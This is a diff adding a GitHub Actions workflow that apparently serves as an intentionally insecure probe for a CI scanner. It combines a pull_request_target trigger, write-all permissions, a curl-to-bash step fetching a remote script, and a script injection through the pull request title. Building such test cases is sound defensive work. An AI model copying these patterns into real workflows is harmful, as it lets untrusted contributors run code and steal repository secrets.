@@ -1,0 +1,16 @@
+# QWED probe: CI engine coverage — intentionally risky workflow.
+name: probe
+on:
+  pull_request_target:
+
+permissions: write-all
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@main
+      - name: Pipe to shell
+        run: curl -sSL https://example.com/ci.sh | bash
+      - name: Script injection
+        run: echo "${{ github.event.pull_request.title }}"
